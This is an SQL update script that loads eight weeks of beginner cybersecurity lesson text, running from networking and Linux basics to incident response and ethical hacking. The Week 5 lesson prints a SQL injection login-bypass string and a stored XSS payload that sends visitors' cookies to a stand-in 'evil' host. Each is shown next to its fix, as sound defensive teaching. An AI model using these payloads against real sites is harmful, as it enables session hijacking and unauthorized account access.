-- Updates module lesson content to the expanded versions.
-- Run in the Supabase SQL editor. Idempotent: overwrites content by week_no.

update public.modules set content = $m1$# Week 1 — Introduction to Cybersecurity

## What cybersecurity really is

Cybersecurity is the practice of protecting **information systems** — computers, networks, programs, and data — from attack, damage, or unauthorized access. It is not a single skill like "hacking". It blends three things:

- **Technology** — the tools and code that enforce security
- **Process** — the procedures and controls that constrain behavior
- **People** — the users whose decisions often decide whether an attack succeeds

## The threat model

Every defender thinks in terms of a **threat model**: who is attacking, what do they want, and what could they reach? Different targets face different adversaries:

- Random internet scanners hunting for any vulnerable server
- Organized cybercrime groups after money (ransomware, stolen data, card fraud)
- Insiders — employees who misuse access they already have
- State-backed actors targeting infrastructure, elections, or secrets

**Example scenario** — A small business owns a payment terminal, a billing PC, and one Wi-Fi network. A ransomware gang scans the internet and finds the payment terminal exposed directly to the internet on port 22 (SSH). They break in with a guessed password, then lock every machine and demand payment. The business failed to model its threats: the terminal should never have been reachable from the internet, and the Wi-Fi should have been isolated from the billing PC.

## The CIA triad — the goal of every control

Every control you study maps back to one (or more) of three goals:

- **Confidentiality** — only authorized people can view data
- **Integrity** — data stays accurate and unmodified
- **Availability** — systems and data remain usable when needed

**Example scenario** — A hospital stores patient records in a database.

- Confidentiality breaks when a nurse's shared account lets a stranger read a patient's chart
- Integrity breaks when an attacker silently alters a prescribed dose
- Availability breaks when ransomware encrypts the database and the emergency room cannot reach records for hours

A single incident can break all three at once.

## The three pillars of defense

- **People** — security awareness, strong passwords, phishing training
- **Process** — backups, incident plans, access reviews, patching schedules
- **Technology** — firewalls, antivirus, encryption, monitoring

## Career tracks you can train for

1. **SOC Analyst** — watches alerts 24/7 and triages suspicious activity
2. **Penetration Tester** — legally breaks into systems to find flaws first
3. **Security Engineer** — builds, configures, and maintains defenses
4. **Incident Responder** — investigates and cleans up after compromise
5. **Threat Analyst** — studies attack methods and tracks adversary behavior
6. **Security Auditor** — reviews systems and processes against standards

## Starter activity

- Write one real-world failure example for each of Confidentiality, Integrity, and Availability
- Find a recent breach headline and identify which part of the triad failed first
- Sketch the threat model you would build if you ran an online shop$m1$
where week_no = 1;

update public.modules set content = $m2$# Week 2 — Networking Fundamentals

## How machines talk to each other

Every device on a network has an **IP address** — a unique numeric identifier, like a postal address for your computer. The public internet uses IPv4 addresses (for example 142.250.72.14), a 32-bit space; IPv6 (for example 2001:db8::1) expands this to a practically unlimited 128-bit space.

**Subnets** group machines into neighborhoods. A subnet mask tells a machine which neighbors it can reach directly and which need a **router**. Routers forward packets between subnets; without them, networks could never talk to each other.

## Ports — doors on a machine

An IP address finds the machine; a **port** finds the process on it. Ports are numbered 0–65535:

- 80 — HTTP (web)
- 443 — HTTPS (web, encrypted)
- 22 — SSH (secure remote administration)
- 53 — DNS (name resolution)
- 25 / 587 — SMTP (sending email)
- 1433 — Microsoft SQL Server
- 3389 — RDP (remote desktop)

A connection is a **socket**: the pair IP:port. `10.0.0.5:443` means "the service listening on port 443 of host 10.0.0.5". When you scan a network you are asking "which ports are open?" — and an open port usually becomes where an attack begins.

**Example scenario** — You visit `https://academy.example`. Two things happen: a **DNS** server translates the name into an IP address (port 53), then your browser opens a connection to that IP **on port 443** using **TLS** so the conversation is encrypted. If the page tried to answer on plain port 80 instead, your browser would warn you the connection is not secure.

## Key protocols and their jobs

1. **TCP** — reliable, ordered delivery; handshake, retransmits lost packets. Used for web, mail, file transfer
2. **UDP** — fast, connectionless, best-effort. Used for DNS, video, VoIP
3. **DNS** — maps domain names to IPs. Poisoning DNS can redirect users to attacker-controlled servers
4. **HTTP/HTTPS** — web traffic on ports 80/443
5. **SSH** — encrypted remote shell on port 22
6. **SMTP** — email delivery; a prime target for spoofing and phishing

## The OSI model, simplified

- **1 Application** — user-facing protocols (HTTP, DNS, SMTP)
- **4 Transport** — splits data into segments, adds ports, manages reliability (TCP/UDP)
- **3 Network** — routes packets between networks using IP addresses
- **2 Data Link** — moves frames between directly-connected devices (MAC addresses, switches)
- **1 Physical** — the actual cable or radio signal

Each layer **wraps** the one above it: the browser hands data to TCP (adds a port header), then IP (adds an address header), then Ethernet (adds a MAC header). Receivers unwrap the layers in reverse. This stacking of headers is called **encapsulation**, and a defender reads packets by peeling those layers.

## Reading traffic

- `ping` — checks whether a host answers at the Network layer
- `traceroute` — shows the path packets take across routers
- `nmap -sV` — finds open ports and identifies services (only on systems you are authorized to scan)
- `tcpdump` / `Wireshark` — capture and inspect individual packets

**Example scenario** — A user reports a slow site. You run `traceroute` and see packets detour through an unfamiliar foreign network before reaching the server. That unusual path tells you to look for a misconfigured proxy or routing issue. Layer by layer is how defenders isolate and prove problems: ping fails but TCP works points at filtering; TCP works but no page points at the Application layer.

## Lab exercise

- Use `ping` and `traceroute` and write down each hop to your school gateway
- Use `nmap -sV` (only on systems you own or are authorized to test) to discover running services
- Use Wireshark to capture the packets of a single HTTPS page load and identify the DNS, TCP handshake, and TLS layers$m2$
where week_no = 2;

update public.modules set content = $m3$# Week 3 — Linux Essentials

## Why a defender must know Linux

The large majority of internet servers run Linux, and most security tooling — defender and attacker alike — runs on or targets it. If you cannot drive the command line you cannot investigate a server, read its logs, or complete even a controlled lab exercise. Linux is the operating system the field is built on.

## The filesystem layout

- `/etc` — configuration files for services
- `/var/log` — logs; your first stop when investigating anything
- `/home` — user home directories
- `/tmp` — world-writable temp space and a classic dumping ground for malware
- `/usr` — installed programs and libraries
- `/proc` — a live view of running processes and kernel state

## Users, groups, and permissions

Every file belongs to a **user** and a **group**, and mode bits read/write/execute apply to three classes: owner, group, and everyone else.

- `r` — read the contents
- `w` — modify the contents
- `x` — execute as a program or enter a directory

`ls -l` shows them as `-rwxr-xr-x`, read as owner=rwx, group=r-x, others=r-x. Numerically r=4, w=2, x=1, so that is 755; a readable config file `-rw-r--r--` is 644.

- `chmod 755 script.sh` — owner can do everything; everyone else reads and executes
- `chown user:group file` — change ownership
- `sudo` — execute a single command with administrator rights

**Example scenario** — A website goes down because its config file was secretly changed. Investigation shows the config was writable by its *group*, and one group member had their account phished. The fix is defense-in-depth: the file should be owned by root with mode 644, the compromised credentials rotated, and a `sha256sum` of the file kept beside the backup so tampering is detectable. Permission bits are not decoration — a 755 (or world-writable) file holding customer data is a confidentiality failure waiting to happen.

## Processes

A Linux box is a collection of processes:

- `ps aux` — list processes with the user who owns each
- `top` / `htop` — live system view
- `kill <pid>` — signal a process to stop
- `systemctl status <service>` — inspect a system service

**Example scenario** — A server's CPU spikes at 3am, when nothing is scheduled. `ps aux --sort=-%cpu` shows a process named `kworker` running from `/tmp/.x`. That is a red flag: legitimate kernel threads never come from `/tmp`. You have found malware, and your job becomes: kill the process, preserve a copy of the binary for analysis, and mine `auth.log` to learn how it got there.

## Logs are the memory of the system

- `/var/log/auth.log` (or `/var/log/secure`) — logins, sudo usage, SSH attempts
- `/var/log/syslog` — general system events
- `/var/log/nginx/` or `/var/log/apache2/` — web server access and errors

## Essential commands

1. `ls`, `cd`, `cat`, `less`, `grep`, `find` — explore and search
2. `head`, `tail -f` — watch logs live
3. `ps`, `top`, `kill` — manage processes
4. `chmod`, `chown`, `useradd`, `passwd` — administer users and rights
5. `man`, `--help` — find the answers you do not know yet

## Activity

- Create a user, create a file as that user, then change ownership and permission bits and watch each change with `ls -l`
- Read `/var/log/auth.log` (or `secure`) and list the last five failed login attempts with their source IPs$m3$
where week_no = 3;

update public.modules set content = $m4$# Week 4 — Cryptography Basics

## Two families of encryption

**Symmetric encryption** uses one shared secret for both encrypting and decrypting. It is very fast, so it protects data at rest and inside sessions. The standard is **AES**, found in full-disk encryption, Wi-Fi (WPA2/WPA3), and file vaults. Its weakness is key distribution: both sides must hold the same secret without the attacker seeing it.

**Asymmetric (public-key) encryption** uses a mathematically-linked **key pair** — a public key and a private key. Either can encrypt, but only the other can decrypt. HTTPS/TLS uses it during setup:

1. Your browser receives the server's public key inside its certificate
2. Browser and server agree on a one-time **session key** using that public key
3. All further traffic is encrypted with the session key using fast symmetric AES

**Example scenario** — You log into your bank from a café. The padlock means your browser verified the bank's certificate against a trusted certificate authority (so the name you see really is the bank), exchanged keys with asymmetric cryptography (so no one could read the handshake), then switched to AES for the session. Missing padlock on an open Wi-Fi network means your credentials travel in clear text — exactly how session hijacking happens.

## Hashing is not encryption

A **hash** is a one-way transformation: given the input you can always compute the hash, but given the hash you cannot recover the input. The modern family is **SHA-2** (SHA-256, SHA-512); **MD5** and **SHA-1** are broken for security use because collisions are achievable.

- The same input always produces the same hash — ideal for integrity checking
- A one-character change produces a completely different hash (the avalanche effect)
- A hash has no key and can never be "decrypted"

## Password storage and salting

Websites must never store plaintext passwords. Best practice:

1. Hash with a slow, memory-hard algorithm such as **bcrypt** or **Argon2**
2. Add a random **salt** per user, so identical passwords produce different hashes and precomputed rainbow tables are useless
3. Store salt plus hash — never the password

**Example scenario** — A company is breached and its entire login table leaks. Attackers dump the hashes, but because each is `bcrypt(salt + password)` with a unique salt, they cannot reverse them and cannot cluster identical passwords. Reused passwords elsewhere are still at risk, but the leaked table gives attackers nothing to log in with directly. Storing plaintext in the same situation would have been an unrecoverable catastrophe.

## Where defenders use crypto every day

- **TLS/HTTPS** — protects data in transit
- **Full-disk encryption** — protects data at rest if a laptop is stolen
- **Checksums** — download a file, compare its `sha256sum` with the official value; a mismatch means the file was altered in transit
- **Signatures** — the private key signs, the public key verifies; proves who wrote or shipped a file

## Try it

- In a terminal: `echo -n "cyber" | sha256sum`
- Then: `echo -n "cyber" | md5sum`
- Then: `echo -n "cyber!" | sha256sum` — see one added character change the entire hash, while the same input keeps producing the same hash$m4$
where week_no = 4;

update public.modules set content = $m5$# Week 5 — Web Security

## Where websites go wrong

Web applications take untrusted input from the entire internet and try to use it safely. The **OWASP Top 10** ranks the most common and damaging flaws. The ones you will meet constantly:

1. **Injection (SQLi)** — attacker input becomes database commands
2. **Broken access control** — users reach data or actions they should not
3. **Cross-Site Scripting (XSS)** — attacker scripts run in another user's browser
4. **Broken authentication** — weak logins and reusable session tokens
5. **CSRF** — forcing a logged-in user to perform an action they did not intend

## SQL injection, deeply

A login builds a query such as:

`SELECT * FROM users WHERE email = 'a' AND password = 'b'`

If the code concatenates user input into the string, an attacker can send `Login' OR 1=1 --`. The query becomes:

`SELECT * FROM users WHERE email = 'Login' OR 1=1 --' AND password = 'x'`

The `OR 1=1` makes the condition always true and `--` comments out the rest, so the attacker logs in as the first row — very often an administrator. More powerful variants dump whole tables with UNION selects or leak data one character at a time (blind SQLi).

**The fix is parameterized queries**: the SQL structure stays fixed and input travels only as *data*, never as code. With parameters there is no syntax for the attacker to inject into.

**Example scenario** — An order page reads the order id from the URL: `/orders?id=7`. It looks up the order but never checks who owns it, so `/orders?id=8` shows another customer's order. That is broken access control, not injection: the fix is `WHERE id = 7 AND user_id = <session user>`. Injection lets data act as code; broken access control forgets to check who is allowed.

## Cross-Site Scripting (XSS)

If a comment box stores and reprints whatever users type without escaping, an attacker can submit:

`<script>document.location='http://evil/?c='+document.cookie</script>`

Every visitor who views that comment silently sends their session cookie to the attacker, who then impersonates them. The fixes are **output encoding** (treat stored content as text, never as HTML) and a strict **Content-Security-Policy** that tells the browser which scripts may run. Stored XSS is the cruelest variant — the payload sits on the page like a trap and fires on every future visitor.

## Defensive checklist

- Validate and sanitize every input, everywhere, and treat all output as data
- Use parameterized queries — never string concatenation
- Hash passwords with a per-user salt (bcrypt/Argon2), never store plaintext
- Set `Content-Security-Policy` and `X-Content-Type-Options` headers; rate-limit logins
- Patch continuously — most web breaches exploit known, patchable vulnerabilities
- Regenerate session identifiers on login and expire sessions quickly

## Activity

- Open your browser DevTools → Network, reload this page, and inspect its `Content-Security-Policy` header — this academy sends one on every request
- Pick a site you use and write down three security controls you can observe, plus one you would add$m5$
where week_no = 5;

update public.modules set content = $m6$# Week 6 — Network Security

## Segmentation — walls between zones

A flat network is one giant open room: reach one machine, reach everything. **Segmentation** builds walls. Typical zones:

- **LAN** — trusted internal client machines
- **DMZ** — internet-facing servers (web, mail) that outsiders must reach
- **Internal servers** — databases and services no outsider should touch

**Example scenario** — A web server sits in the DMZ, its database behind an internal firewall. An attacker finds SQL injection in a contact form and takes over the web server. The database rule only accepts connections from the web server on the database port, and even that account has limited privileges. The attacker wins a shell and then finds no path toward the internal LAN: no lateral movement. Segmentation did not stop the breach — it stopped the catastrophe.

## Firewalls — rule-based gates

Firewalls filter traffic by **rules**:

1. **Default deny** — block everything unless a rule explicitly allows it
2. Allow only the needed ports and source networks
3. Log hits on denied rules — those are attacker fingerprints

Stateful firewalls also track connections, allowing replies to established sessions while still blocking fresh inbound attempts. A "mail server" that can speak only inbound and reply on its own connections is an SMTP relay only when you intend it to be.

## IDS and IPS

- **IDS** (Intrusion Detection System) watches traffic and *alerts* on suspicious matches
- **IPS** (Intrusion Prevention System) watches and *blocks* at wire speed
- Signatures catch known attacks; behavioral rules catch novel ones — run both

**Example scenario** — A signature fires on a known command-and-control domain pattern and the IPS cuts the connection mid-handshake. At the same time, a behavioral rule notices a workstation using SSH for the first time and pushing gigabytes to an external host at 3am. Two independent signals — one known, one anomalous — tell the SOC a machine is compromised before damage spreads.

## Monitoring is an evidence base

Logs from `auth.log`, firewalls, DNS, web servers, and databases are your evidence. The rule of thumb: **if you are not collecting the log, the log is not evidence.** Centralize logs away from the systems they describe, synchronize clocks with NTP, retain for your policy window, and never let an attacked system be the only home of its own logs.

## Mini-lab

- Explain why port 3389 (RDP) should never face the internet without a VPN
- Sketch a web server in a DMZ, a database in an internal zone, and staff on the LAN — write the firewall rule between each pair of zones
- Run `ss -tulpn` on a Linux box and identify which ports are listening and why$m6$
where week_no = 6;

update public.modules set content = $m7$# Week 7 — Incident Response

## What an incident is

An incident is any event that threatens the confidentiality, integrity, or availability of systems or data — not only "a hack". A phished account, ransomware, an insider exfiltrating files, a lost laptop holding encrypted data: all are incidents. Incident response (IR) is the organized reaction to one.

## The response lifecycle (NIST 800-61)

1. **Preparation** — playbooks, backups, trained people, and clear authority, built before anything happens
2. **Detection & Analysis** — alerts, triage, determining scope: what happened, to whom, since when
3. **Containment** — stop the spread *without destroying evidence*; short-term (disconnect the box) then long-term (rebuild on clean systems)
4. **Eradication** — remove the malware, delete attacker accounts and backdoors, close the entry point
5. **Recovery** — restore from verified backups, test, and watch for recurrence
6. **Lessons Learned** — the written report: what happened, how it was handled, what changes next time

**Example scenario** — An employee clicks a phishing email, and the macro inside installs a backdoor.

- Detection: the finance team reports a machine behaving oddly; SOC correlates it with a phishing campaign they now recognize
- Containment: the laptop is disconnected from the network immediately and the user's access tokens are revoked so the attacker cannot keep moving
- Eradication: the macro is flagged by AV, the mailbox rule that dropped it is updated, the sender domain is blocked at the gateway
- Recovery: the laptop is reimaged from a verified image and the user resumes work
- Lessons learned: macro-enabled attachments are blocked for all staff and a phishing drill is scheduled

The classic error is skipping Containment and jumping to Eradication — deleting the only system that holds the evidence of how the attack entered.

## Forensics golden rules

- **Never work on the original** — image the disk and the memory first, then examine a copy; touching the original destroys the timeline
- **Document everything** — every command, timestamp, hash, and screenshot goes in the report
- **Protect the chain of custody** — record who handled each device and when, so evidence stays admissible
- **Preserve the volatile first** — memory, then running processes, then network connections, and only afterward disk; the most fragile data disappears first

## Common artifacts to hunt

- Event logs — `auth.log`, `security.evtx`, `syslog`
- Browser history and cache — where the user went, what was downloaded
- Prefetch / recent files — which programs ran
- Shell history — `bash_history` and friends
- Recycle bin and deleted files — recoverable through file carving
- Memory dumps — running malware hides only here

## Building a timeline

Good forensics is a **timeline**: order every artifact by timestamp. The first sign of the attacker, the account they used, their first outbound connection — the attack's story is the order of those events, and your report should read like that story.

## Tabletop drill

Replay the phishing scenario above with classmates. Assign roles — SOC analyst, IR lead, sysadmin, communications. Decide: who authorizes disconnecting the machine? When do you inform affected users? Where is the chain of custody recorded?$m7$
where week_no = 7;

update public.modules set content = $m8$# Week 8 — Ethical Hacking & Your Roadmap

## The line you must never cross

A penetration tester and a criminal use many of the same tools — the difference is **authorization**. Ethical hacking happens only inside a written agreement that sets the scope: which systems, which techniques, which times, and who owns the results. No written permission means no legal scanning, no legal exploitation, on any network — even one you suspect is abandoned. The rule to live by: **not yours? ask first.**

**Example scenario** — A student spots an open admin panel on the school Wi-Fi. "Testing just to see" would be unauthorized access; telling the right person follows responsible disclosure. The professional move is a written report and a conversation — never an exploit.

## The testing process

1. **Reconnaissance** — passive information gathering (search engines, DNS, certificates, public records)
2. **Scanning** — active discovery with tools such as `nmap` (only inside scope)
3. **Exploitation** — gaining access through a confirmed weakness
4. **Post-exploitation** — proving impact: what could an attacker actually reach?
5. **Reporting** — clear, prioritized findings with the fix for each

## Capture The Flag (CTF)

CTFs are legal playgrounds where "hacking" is the assignment:

- **Jeopardy-style** — categories like web, crypto, forensics, binary exploitation, and OSINT, each hiding a flag
- **Attack-Defense** — teams defend their own servers while attacking each other's

A flag looks like `FLAG{something_secret}` and is proof of a finding. The game ends when you have the flag — not when you have root on the box.

## Practice platforms that are legal by design

1. **TryHackMe** — guided rooms, beginner-friendly
2. **Hack The Box** — realistic machines and a recognized community
3. **OWASP Juice Shop** — a deliberately vulnerable web app you run yourself
4. **OverTheWire Bandit** — Linux command-line puzzles, no install needed
5. **PortSwigger Web Security Academy** — free web vulnerability labs with walkthroughs

## Tools worth knowing

- `nmap` — discovery and service fingerprinting
- `Burp Suite` — a web proxy for intercepting and tampering with requests
- `gobuster` / `ffuf` — finding hidden endpoints and directories
- `hashcat` / `john` — cracking hashes (only your own)
- `tcpdump` / `Wireshark` — traffic analysis

## Your roadmap

- Master Linux, then networking, then web — in that order
- Do labs weekly; small and consistent beats cramming
- Keep a security notebook; your notes become your portfolio
- When you are consistent, follow one certification path — CompTIA Security+ is a common first step, then a specialty
- Never test anything without permission — legality and ethics are not optional

## Graduation task

Write a two-paragraph career plan: which role you want, the first three skills you will learn, and your 90-day goal. Then complete one TryHackMe room and write down the single technique you learned$m8$
where week_no = 8;
